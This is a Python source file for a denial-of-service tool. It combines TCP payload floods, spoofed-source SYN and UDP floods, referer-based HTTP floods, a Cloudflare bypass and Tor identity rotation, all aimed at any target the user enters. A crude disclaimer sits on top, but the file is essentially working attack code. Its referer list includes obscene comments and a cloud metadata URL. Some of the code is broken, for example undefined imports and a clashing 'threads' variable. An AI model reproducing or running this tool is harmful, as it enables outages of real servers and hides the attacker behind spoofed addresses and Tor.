#########################################################################
 # WARNING: This tool is for EXTREMELY aggressive security testing ONLY!
 # Unauthorized use is HIGHLY illegal and will land your ass in jail, you dumb fuck!
 # Noodles Inc. is NOT responsible for your dumbass actions. Use EXTREMELY responsibly, or you're fucked!
 # THIS SOFTWARE USES A NUCLEAR COMBINATION OF DOS, DDOS AND EXPLOITS THAT WILL
 # FUCKING OBLITERATE SERVERS. USE AT YOUR OWN FUCKING RISK!
 # I AM NOT LIABLE IF YOU BLOW UP SERVERS, BREAK THE INTERNET, OR GET FUCKED BY THE COPS!
 #########################################################################
 

 # LOGGING: All actions will be logged to the browser console for accountability.
 

 # Color Scheme: Dark Green, Purple, Dark Red, Dark Blue
 # Script Start
 

 import threading
 import socket
 import random
 import logging
 import time
 import os
 import sys
 import requests
 import socks  # Import the PySocks library
 from scapy.all import * #Network Scanning Tools for DOS and DDOS attacks
 import traceback
 import stem.process  # For launching Tor
 from stem import Signal
 from stem.util.log import get_logger
 import urllib3
 from urllib.parse import urlparse
 import cfscrape #Bypass Cloudflare
 from contextlib import suppress
 from queue import Queue
 import signal
 

 # Configuration
 TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
 parsed_url = urlparse(TARGET)
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else (443 if parsed_url.scheme == 'https' else 80)
 THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
 PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 65500 # MAXIMUM TCP SIZE
 TIMEOUT = 2
 USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
 TOR_PORT = 9050  # Default Tor port
 CONTROL_PORT = 9051  # Tor control port
 BYPASS_CLOUDFLARE = True
 

 # Global flag to control attack threads
 attack_running = True
 

 # Queue for tasks
 task_queue = Queue()
 

 # List to hold threads
 threads = []
 

 USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 ]
 

 # Setup logging
 logging.basicConfig(level=logging.INFO,
  format='%(asctime)s - %(levelname)s - %(message)s')
 

 def log(message):
  print(message)
  logging.info(message)
 

 # Function to generate a random IP address (for spoofing)
 def generate_random_ip():
  ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
  log(f"\033[35mGenerated spoofed IP: {ip}\033[0m")  # Purple
  return ip
 

 # Function to create a socket and send data
 def tcp_attack(target, port, use_tor=False):
  while attack_running:
  try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(TIMEOUT)
 

  # Try to resolve domain name
  try:
  ip = socket.gethostbyname(target)
  except socket.gaierror:
  log(f"\033[31mCould not resolve host: {target}\033[0m")  # Dark Red
  return
 

  # Connect via Tor if USE_TOR is True
  if use_tor:
  socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)  # Default Tor port
  socket.socket = socks.socksocket  # Use SOCKS socket
 

  s.connect((ip, port))
 

  # Add TCP Socket options
  s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 

  # Build HTTP request
  http_header = (
  f"GET / HTTP/1.1\r\n"
  f"Host: {target}\r\n"
  f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
  f"X-Forwarded-For: {generate_random_ip()}\r\n"  # Spoof IP
  f"Connection: Keep-Alive\r\n"
  f"Cache-Control: max-age=0\r\n"
  f"\r\n"
  )
 

  # Build payload
  payload = http_header + 'A' * PAYLOAD_SIZE
  s.send(payload.encode('utf-8'))
 

  log(f"\033[34mSent {len(payload)} bytes to {target}:{port}\033[0m")  # Dark Blue
  s.close()
 

  # Add a slight delay to avoid overwhelming the system
  time.sleep(random.uniform(0.01, 0.1)) #Faster than before
  except socket.error as e:
  log(f"\033[31mSocket error: {e}\033[0m")  # Dark Red
  except Exception as e:
  log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
  log(traceback.format_exc())
 

 

 # Function to perform SYN flood attack
 def syn_flood(target_ip, target_port):
  while attack_running:
  try:
  # Craft a SYN packet
  ip = IP(src=generate_random_ip(), dst=target_ip)
  syn = TCP(sport=RandShort(), dport=target_port, flags='S')
  raw = Raw(b"X" * 65500) #Maximum Packet Size
  p = ip / syn / raw
 

  # Send the packet
  send(p, verbose=0)
  except Exception as e:
  log(f"\033[31mAn unexpected error occurred in syn_flood: {e}\033[0m")  # Dark Red
  log(traceback.format_exc())
 

 def udp_flood(target_ip, target_port):
  while attack_running:
  try:
  # Craft a UDP packet
  ip = IP(src=generate_random_ip(), dst=target_ip)
  udp = UDP(sport=RandShort(), dport=target_port)
  raw = Raw(b"X" * 65500) #Maximum Packet Size
  p = ip / udp / raw
 

  # Send the packet
  send(p, verbose=0)
  except Exception as e:
  log(f"\033[31mAn unexpected error occurred in udp_flood: {e}\033[0m")  # Dark Red
  log(traceback.format_exc())
 

 # Function to renew Tor identity
 def renew_tor_identity():
  try:
  with Controller.from_port(port=CONTROL_PORT) as controller:
  controller.authenticate(password="your_tor_control_password")  # Replace with your Tor control password if set
  controller.signal(Signal.NEWNYM)
  log("\033[32mSuccessfully renewed Tor identity.\033[0m")  # Dark Green
  except Exception as e:
  log(f"\033[31mFailed to renew Tor identity: {e}\033[0m")  # Dark Red
 

 # List of Referers (Modified)
 referers = [
  "https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=",
  "https://drive.google.com/viewerng/viewer?url=",
  "http://www.google.com/translate?u=",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "http://www.bing.com/search?q=",
  "https://www.google.com/",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://r.search.yahoo.com/",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
  "https://www.google.com/",
  "https://www.cloudflare.com/",  # Bypass Cloudflare
  "https://www.bing.com/",
  "https://yandex.com/",
  "https://duckduckgo.com/",
  "https://www.baidu.com/",
  "https://www.yahoo.com/",
  "https://www.ask.com/",
  "https://www.aol.com/",
  "https://www.lycos.com/",
  "https://www.excite.com/",
  "https://www.infospace.com/",
  "https://metacrawler.com/",
  "https://www.dogpile.com/",
  "https://www.startpage.com/",
  "https://www.searchencrypt.com/",
  "https://gigablast.com/",
  "https://swisscows.com/",
  "https://www.qwant.com/",
  "https://www.ecosia.org/",
  "https://search.brave.com/",
  "http://web.archive.org/",
  "https://www.alexa.com/siteinfo/",
  "https://builtwith.com/",
  "https://www.similarweb.com/website/",
  "https://www.whois.com/whois/",
  "https://securitytrails.com/domain/",
  "https://www.shodan.io/search?query=",
  "https://censys.io/ipv4?q=",
  "https://otx.alienvault.com/browse/global",
  "https://urlscan.io/result/",
  "https://virustotal.com/gui/home/upload",
  "https://www.abuseipdb.com/check/",
  "https://talosintelligence.com/reputation_center/lookup?search=",
  "https://mxtoolbox.com/SuperTool.aspx?action=mx%3a&run=toolpage",
  "https://bgp.he.net/dns/",
  "https://www.ultratools.com/tools/ping",
  "https://www.site24x7.com/check-website-availability.html",
  "https://tools.keycdn.com/ping",
  "https://www.uptrends.com/tools/uptime-test",
  "https://www.dotcom-monitor.com/website-speed-test",
  "https://gtmetrix.com/",
  "https://developers.google.com/speed/pagespeed/insights/",
  "https://webpagetest.org/",
  "https://www.thinkwithgoogle.com/intl/en-gb/feature/testmysite/",
  # Removed government sites as they are misleading and unnecessary
  "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", # Grab Google Servers and get the IP
  "https://fuckyou.bigmancozmo.com/",  # Personal Webpage Backdoor Access
  "https://www.pornhub.com/", # Get that dick rocked
  "https://www.xvideos.com/", # Get that pussy licked
  "https://www.redtube.com/", # Get that ass rammed
  "https://www.youporn.com/", # Get that cum stained
  "https://www.xnxx.com/", # Get that nut spilled
 ]
 

 def generate_referer():
  return random.choice(referers)
 

 # Function to bypass Cloudflare's Anti-DDoS measures
 def bypass_cloudflare(url):
  try:
  # Use cfscrape to bypass Cloudflare
  scraper = cfscrape.create_scraper()
  response = scraper.get(url, timeout=10)
 

  # Check if the request was successful
  if response.status_code == 200:
  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
  return True
  else:
  log(f"\033[31mFailed to bypass Cloudflare. Status code: {response.status_code}\033[0m")  # Dark Red
  return False
  except cfscrape.exceptions.CloudflareChallengeError as e:
  log(f"\033[31mCloudflare challenge error: {e}\033[0m")  # Dark Red
  return False
  except requests.exceptions.RequestException as e:
  log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
  return False
  except Exception as e:
  log(f"\033[31mAn unexpected error occurred during Cloudflare bypass: {e}\033[0m")
  log(traceback.format_exc())
  return False
 

 def referer_attack(target, use_tor=False):
  while attack_running:
  try:
  referer = generate_referer()
  # Setup proxy if USE_TOR is True
  proxies = {}
  if use_tor:
  proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
 

  if BYPASS_CLOUDFLARE:
  bypassed = bypass_cloudflare(target)
  if bypassed:
  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
  else:
  log("\033[31mFailed to bypass Cloudflare.\033[0m")  # Dark Red
 

  requests.get(target, headers={'Referer': referer, 'User-Agent': random.choice(USER_AGENTS)}, proxies=proxies, timeout=TIMEOUT)
  log(f"\033[34mSent referer: {referer} to {target}\033[0m")  # Dark Blue
  except requests.exceptions.RequestException as e:
  log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
  except Exception as e:
  log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
  log(traceback.format_exc())
  time.sleep(random.uniform(0.01, 0.1)) # Faster Rate
 

 def worker():
  while True:
  task = task_queue.get()
  try:
  task()
  except Exception as e:
  log(f"\033[31mError executing task: {e}\033[0m")
  log(traceback.format_exc())
  finally:
  task_queue.task_done()
 

 def start_attack(target, port, threads, use_tor):
  global attack_running, threads
  attack_running = True
 

  # Start threads for TCP attack
  for _ in range(threads):
  task_queue.put(lambda: tcp_attack(target, port, use_tor))
  # Start threads for SYN flood
  task_queue.put(lambda: syn_flood(target, port))
  # Start threads for UDP flood
  task_queue.put(lambda: udp_flood(target, port))
  # Start threads for referer attacks
  task_queue.put(lambda: referer_attack(target, use_tor))
  log(f"\033[32mStarting referer attack on {target} with {threads} threads...\033[0m")  # Dark Green
  log(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
 

  # Create worker threads
  for _ in range(threads * 4):  # Multiply by 4 since there are 4 types of attacks
  t = threading.Thread(target=worker)
  t.daemon = True
  threads.append(t)
  t.start()
 

 def stop_attack():
  global attack_running
  attack_running = False
  task_queue.join()  # Wait for all tasks to be completed
  for t in threads:
  t.join(timeout=1)  # Wait for threads to finish
 

  log("\033[31mStopping all attack threads...\033[0m")
 

 def signal_handler(sig, frame):
  print("\nCtrl+C detected. Stopping the attack...")
  stop_attack()
  sys.exit(0)
 

 if __name__ == "__main__":
  signal.signal(signal.SIGINT, signal_handler)
  print("Type 'start' to begin the attack, or 'stop' to end it.")
  while True:
  command = input("> ").lower()
  if command == 'start':
  start_attack(TARGET, PORT, THREADS, USE_TOR)
  elif command == 'stop':
  stop_attack()
  else:
  print("Invalid command. Use 'start' or 'stop'.")